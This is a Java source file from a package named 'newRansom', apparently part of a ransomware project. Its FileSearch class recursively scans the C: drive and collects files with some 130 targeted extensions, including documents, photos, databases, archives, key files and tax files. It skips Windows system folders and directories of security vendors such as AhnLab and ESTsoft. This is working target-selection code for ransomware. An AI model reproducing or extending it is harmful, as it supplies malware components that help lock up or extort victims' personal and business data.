package newRansom;

import java.io.File;
import java.util.ArrayList;

import org.apache.commons.io.FilenameUtils;

public class FileSearch {
	private static String defaultDirectory;
	private static ArrayList<File> allFiles = new ArrayList<>();
	private static ArrayList<String> containsFilters = new ArrayList<>();
	private static int i = 0, j = 0;

	public FileSearch() {

		setDefaultDirectory("C:");

		initContainFilter();
	}

	private static String filepath() {
		String path = allFiles.get(i++).getPath();
		return path;
	}

	private static String filename() {
		String name = allFiles.get(j++).getName();
		return name;
	}

	void setDefaultDirectory(String defaultDirectory) {
		this.defaultDirectory = defaultDirectory;
	}

	public ArrayList<File> allFileSearch() {

		getFileList(defaultDirectory);
		return allFiles;
	}

	private void initContainFilter() {
		// Text files
		containsFilters.add("doc");
		containsFilters.add("docx");
		containsFilters.add("log");
		containsFilters.add("msg");
		containsFilters.add("odt");
		containsFilters.add("pages");
		containsFilters.add("rtf");
		containsFilters.add("tex");
		containsFilters.add("txt");
		containsFilters.add("wpd");
		containsFilters.add("wps");
		containsFilters.add("hwp");

		// Data files
		containsFilters.add("csv");
		containsFilters.add("dat");
		containsFilters.add("gbr");
		containsFilters.add("ged");
		containsFilters.add("key");
		containsFilters.add("keychain");
		containsFilters.add("pps");
		containsFilters.add("pps");
		containsFilters.add("ppt");
		containsFilters.add("pptx");
		containsFilters.add("sdf");
		containsFilters.add("tar");
		containsFilters.add("tax2012");
		containsFilters.add("tax2014");
		containsFilters.add("vcf");
		containsFilters.add("xml");

		// Audio files
		containsFilters.add("alf");
		containsFilters.add("iff");
		containsFilters.add("m3u");
		containsFilters.add("m4a");
		containsFilters.add("mid");
		containsFilters.add("mp3");
		containsFilters.add("mpa");
		containsFilters.add("ra");
		containsFilters.add("wav");
		containsFilters.add("wma");

		// Video files
		containsFilters.add("3g2");
		containsFilters.add("3gp");
		containsFilters.add("asf");
		containsFilters.add("asf");
		containsFilters.add("asx");
		containsFilters.add("avi");
		containsFilters.add("flv");
		containsFilters.add("m4v");
		containsFilters.add("mov");
		containsFilters.add("mp4");
		containsFilters.add("mpg");
		containsFilters.add("rm");
		containsFilters.add("srt");
		containsFilters.add("swf");
		containsFilters.add("vob");
		containsFilters.add("wmv");

		// 3D image files
		containsFilters.add("3dm");
		containsFilters.add("3ds");
		containsFilters.add("max");
		containsFilters.add("obj");

		// Raster image files
		containsFilters.add("bmp");
		containsFilters.add("dds");
		containsFilters.add("gif");
		containsFilters.add("jpg");
		containsFilters.add("png");
		containsFilters.add("psd");
		containsFilters.add("pspimage");
		containsFilters.add("tga");
		containsFilters.add("thm");
		containsFilters.add("tif");
		containsFilters.add("tiff");
		containsFilters.add("yuv");

		// Vector image files
		containsFilters.add("ai");
		containsFilters.add("eps");
		containsFilters.add("ps");
		containsFilters.add("svg");

		// Page layout files
		containsFilters.add("indd");
		containsFilters.add("pct");
		containsFilters.add("pdf");

		// Spreadsheet files
		containsFilters.add("xlr");
		containsFilters.add("xls");
		containsFilters.add("xlsx");

		// Database files
		containsFilters.add("db");
		containsFilters.add("dbf");
		containsFilters.add("sql");

		// Compressed files
		containsFilters.add("7z");
		containsFilters.add("rar");
		containsFilters.add("zip");
		containsFilters.add("tar.gz");

		// Executable files
		containsFilters.add("apk");
		containsFilters.add("app");
		containsFilters.add("com");
		containsFilters.add("exe");
		containsFilters.add("jar");

		// Web files
		containsFilters.add("asp");
		containsFilters.add("aspx");
		containsFilters.add("css");
		containsFilters.add("htm");
		containsFilters.add("html");
		containsFilters.add("js");
		containsFilters.add("jsp");
		containsFilters.add("php");
		containsFilters.add("xhtml");

		// Font files
		containsFilters.add("fnt");
		containsFilters.add("fon");
		containsFilters.add("oft");
		containsFilters.add("ttf");

		// Mick files
		containsFilters.add("crdownload");
		containsFilters.add("ics");
		containsFilters.add("msi");
		containsFilters.add("part");
		containsFilters.add("torrent");
		
		containsFilters.add("alpha");

	}

	public void getFileList(String source) {
		File dir = new File(source);
		File[] fileList = dir.listFiles();
		try {
			if (fileList != null) {
				for (File file : fileList) {
					if (file.isFile()) {

						if (isAvailableFile(file)) {
							allFiles.add(file);
						}
					} else if (file.isDirectory()) {
						if(!IsImportDirectory(file)) {
		//				System.out.println(file.getCanonicalPath());
						getFileList(file.getCanonicalPath());}
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	public boolean IsImportDirectory(File file) {
		String name = file.getName();
		ArrayList<String> importdir = new ArrayList<>();
		importdir.add("WINDOWS");
		importdir.add("RECYCLER");
		importdir.add("Program Files");
		importdir.add("Program Files (x86)");
		importdir.add("Windows");
		importdir.add("Recycler");
		importdir.add("TEMP");
		importdir.add("APPDATA");
		importdir.add("AppData");
		importdir.add("Temp");
		importdir.add("ProgramData");
		importdir.add("Microsoft");
		importdir.add("ESTsoft");
		importdir.add("AhnLab");
		importdir.add("All Users");
		importdir.add("Getting Over It With Bennett Foddy");
		for(int i = 0 ;i<importdir.size();i++)
			{if(importdir.get(i).equals(name)) return true;}

		return false;
	}
	
	public boolean isAvailableFile(File file) {
		return FileSearch.containsFilters.contains(FilenameUtils.getExtension(file.getName().toLowerCase()));
	}

	public ArrayList<File> alphaFileSearch() {
		getFileList(defaultDirectory);
		return allFiles;
	}
}
